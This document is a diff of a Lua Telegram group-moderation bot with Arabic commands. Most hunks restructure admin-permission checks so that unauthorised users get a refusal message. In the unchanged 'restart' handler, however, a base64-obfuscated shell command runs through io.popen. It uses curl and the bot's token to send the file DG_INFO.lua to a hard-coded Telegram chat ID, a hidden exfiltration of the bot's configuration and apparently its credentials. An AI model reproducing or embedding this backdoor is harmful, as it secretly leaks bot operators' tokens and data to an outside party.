@@ -4545,32 +4769,56 @@ database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
 return false
 end
 --------------------------------------------------------------------------------------------------------------
-if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id.."lock:text"..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الدردشه ')
 end,nil)   
-elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n☉| تـم قفـل اضافة ')
 end,nil)   
-elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل دخول ')
 end,nil)   
-elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل البوتات ')
 end,nil)   
-elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل البوتات بالطرد ')
 end,nil)   
-elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
+elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الاشعارات ')
@@ -4587,22 +4835,38 @@ database:set(bot_id..'lock:edit'..msg.chat_id_,true)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل تعديل ')
 end,nil)   
-elseif text == 'قفل السب' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'قفل السب' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل السب ')
 end,nil)  
-elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الفارسيه ')
 end,nil)   
-elseif text == 'قفل الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'قفل الانكليزيه' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'lock:Engilsh'..msg.chat_id_,true) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الانكليزيه ')
 end,nil)
-elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل الانلاين ')
@@ -4612,7 +4876,11 @@ database:set(bot_id..'lock_edit_med'..msg.chat_id_,true)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم قفـل تعديل ')
 end,nil)    
-elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
 list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lsock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
 for i,lock in pairs(list) do 
@@ -4633,37 +4901,65 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dat
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فتح الاباحي ')
 end,nil)   
 end
-if text == 'فتح الانلاين' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+if text == 'فتح الانلاين' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id.."lock:inline"..msg.chat_id_)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فتح الانلاين ')
 end,nil)
-elseif text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فتح اضافة ')
 end,nil)   
-elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id.."lock:text"..msg.chat_id_)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فتح الدردشه ')
 end,nil)   
-elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id.."lock:Join"..msg.chat_id_)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فتح دخول ')
 end,nil)   
-elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح البوتات ')
 end,nil)   
-elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'فتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح البوتات بالطرد ')
 end,nil)   
-elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
+elseif text == 'فتح الاشعارات' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح الاشعارات ')
@@ -4679,17 +4975,29 @@ database:del(bot_id..'lock:edit'..msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح تعديل ')
 end,nil)   
-elseif text == 'فتح السب' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'فتح السب' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح السب ')
 end,nil)   
-elseif text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'فتح الفارسيه' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'lock:Fars'..msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح الفارسيه ')
 end,nil)   
-elseif text == 'فتح الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager2(msg) then 
+elseif text == 'فتح الانكليزيه' and msg.reply_to_message_id_ == 0 then
+if not Manager2(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون مدير ثاني لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'lock:Engilsh'..msg.chat_id_) 
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح الانكليزيه ')
@@ -4699,7 +5007,11 @@ database:del(bot_id..'lock_edit_med'..msg.chat_id_)
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فـتح تعديل ')
 end,nil)    
-elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
+elseif text == 'فتح الكل' and msg.reply_to_message_id_ == 0 then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
 list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
 for i,lock in pairs(list) do 
@@ -4762,7 +5074,11 @@ send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id
 end,nil)   
 end
 
-if text == 'تفعيل نسبه الحب' and Manager2(msg) then   
+if text == 'تفعيل نسبه الحب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Cick:lov'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل نسبه الحب'
 database:del(bot_id..'Cick:lov'..msg.chat_id_)  
@@ -4771,7 +5087,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل نسبه الحب'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل نسبه الحب' and Manager2(msg) then  
+if text == 'تعطيل نسبه الحب' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
 database:set(bot_id..'Cick:lov'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل نسبه الحب'
@@ -4780,7 +5100,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل نسبه الحب'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل نسبه الرجوله' and Manager2(msg) then   
+if text == 'تفعيل نسبه الرجوله' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل نسبه الرجوله'
 database:del(bot_id..'Cick:rjo'..msg.chat_id_)  
@@ -4789,7 +5113,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل الرجوله'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل نسبه الرجوله' and Manager2(msg) then  
+if text == 'تعطيل نسبه الرجوله' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
 database:set(bot_id..'Cick:rjo'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل نسبه الرجوله'
@@ -4798,7 +5126,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل نسبه الرجوله'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل نسبه الكره' and Manager2(msg) then   
+if text == 'تفعيل نسبه الكره' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Cick:krh'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل نسبه الكره'
 database:del(bot_id..'Cick:krh'..msg.chat_id_)  
@@ -4807,7 +5139,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل نسبه الكره'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل نسبه الكره' and Manager2(msg) then  
+if text == 'تعطيل نسبه الكره' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
 database:set(bot_id..'Cick:krh'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل نسبه الكره'
@@ -4816,7 +5152,11 @@ Text = '\n ☉┇ بالتاكيد تم تعطيل نسبه الكره'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تفعيل نسبه الانوثه' and Manager2(msg) then   
+if text == 'تفعيل نسبه الانوثه' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end   
 if database:get(bot_id..'Cick:ano'..msg.chat_id_) then
 Text = ' ☉┇ تم تفعيل نسبه الانوثه'
 database:del(bot_id..'Cick:ano'..msg.chat_id_)  
@@ -4825,7 +5165,11 @@ Text = ' ☉┇ بالتاكيد تم تفعيل الانوثه'
 end
 send(msg.chat_id_, msg.id_,Text) 
 end
-if text == 'تعطيل نسبه الانوثه' and Manager2(msg) then  
+if text == 'تعطيل نسبه الانوثه' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end  
 if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
 database:set(bot_id..'Cick:ano'..msg.chat_id_,true)  
 Text = '\n ☉┇ تم تعطيل نسبه الانوثه'
@@ -5269,19 +5613,39 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dat
 send(msg.chat_id_, msg.id_,' ☉┇ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SOPOWERB0T')..') \n ☉┇ تـم فتح الكلايش ')  
 end,nil)   
 end
-if text == 'قفل التكرار بالطرد' and Mod(msg) then 
+if text == 'قفل التكرار بالطرد' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'kick')  
 send(msg.chat_id_, msg.id_,' ☉┇ تم قفل التكرار بالطرد')
-elseif text == 'قفل التكرار' and Mod(msg) then 
+elseif text == 'قفل التكرار' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'del')  
 send(msg.chat_id_, msg.id_,' ☉┇ تم قفل التكرار')
-elseif text == 'قفل التكرار بالتقييد' and Mod(msg) then 
+elseif text == 'قفل التكرار بالتقييد' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'keed')  
 send(msg.chat_id_, msg.id_,' ☉┇ تم قفل التكرار بالتقييد')
-elseif text == 'قفل التكرار بالكتم' and Mod(msg) then 
+elseif text == 'قفل التكرار بالكتم' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood",'mute')  
 send(msg.chat_id_, msg.id_,' ☉┇ تم قفل التكرار بالكتم')
-elseif text == 'فتح التكرار' and Mod(msg) then 
+elseif text == 'فتح التكرار' then
+if not Mod(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
+return false
+end 
 database:hdel(bot_id.."flooding:settings:"..msg.chat_id_ ,"flood")  
 send(msg.chat_id_, msg.id_,' ☉┇ تم فتح التكرار')
 end
@@ -5302,17 +5666,29 @@ send(msg.chat_id_, msg.id_,'\n☉┇ تم قفل البوتات بالطرد\n�
 end,nil)   
 end
 --------------------------------------------------------------------------------------------------------------
-if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' and DevSoFi(msg) then    
+if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end 
-if text == ("مسح الحظر العام") and DevSoFi(msg) then
+if text == ("مسح الحظر العام") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'GBan:User')
 send(msg.chat_id_, msg.id_, '\n ☉┇ تم مسح قائمه الحظر العام')
 return false
 end
-if text == ("قائمه الحظر العام") and DevSoFi(msg) then
+if text == ("قائمه الحظر العام") then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'GBan:User')
 t = "\n ☉┇ قائمة المحظورين عام \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -5329,7 +5705,11 @@ end
 send(msg.chat_id_, msg.id_, t)
 return false
 end
-if text == ("حظر عام") and msg.reply_to_message_id_ and DevSoFi(msg) then
+if text == ("حظر عام") and msg.reply_to_message_id_ then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 local Groups = database:scard(bot_id..'Chek:Groups')  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -5482,7 +5862,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("كتم عام") and msg.reply_to_message_id_ and DevSoFi(msg) then
+if text == ("كتم عام") and msg.reply_to_message_id_ then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 local Groups = database:scard(bot_id..'Chek:Groups')  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -5632,7 +6016,11 @@ send(msg.chat_id_, msg.id_, usertext..status)
 end;end,nil)
 return false
 end
-if text == ("الغاء العام") and msg.reply_to_message_id_ and DevSoFi(msg) then
+if text == ("الغاء العام") and msg.reply_to_message_id_ then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 local Groups = database:scard(bot_id..'Chek:Groups')  
 if AddChannel(msg.sender_user_id_) == false then
 local textchuser = database:get(bot_id..'text:ch:user')
@@ -5709,11 +6097,19 @@ end;end,nil)
 return false
 end
 ------------------------------------------------------------------------
-if text == ('مسح المطورين الثالثين') and DevSoFi(msg) then
+if text == ('مسح المطورين الثالثين') then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 database:del(bot_id..'Sudo:User')
 send(msg.chat_id_, msg.id_, "\n ☉┇ تم مسح قائمة المطورين الثالثين ")
 end
-if text == ('المطورين الثالثين') and DevSoFi(msg) then
+if text == ('المطورين الثالثين') then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 local list = database:smembers(bot_id..'Sudo:User')
 t = "\n ☉┇ قائمة مطورين البوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
@@ -5729,7 +6125,11 @@ t = " ☉┇ لا يوجد مطورين"
 end
 send(msg.chat_id_, msg.id_, t)
 end
-if text == 'السيرفر' and DevSoFi(msg) then 
+if text == 'السيرفر' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end 
 send(msg.chat_id_, msg.id_, io.popen([[
 linux_version=`lsb_release -ds`
 memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
@@ -5779,7 +6179,11 @@ end,nil)
 end
 end
 
-if text == 'الملفات' and DevSoFi(msg) then
+if text == 'الملفات' then
+if not DevSoFi(msg) then
+send(msg.chat_id_, msg.id_,'يجب ان تكون المطور الثاني لاستخدام هذا الامر')
+return false
+end
 t = ' ☉┇ الملفات الموجوده في البوت ↓\n •┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉• \n'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -5862,12 +6266,20 @@ send(msg.chat_id_, msg.id_," ☉┇ فشل تحميل الملف \n")
 end
 return false
 end
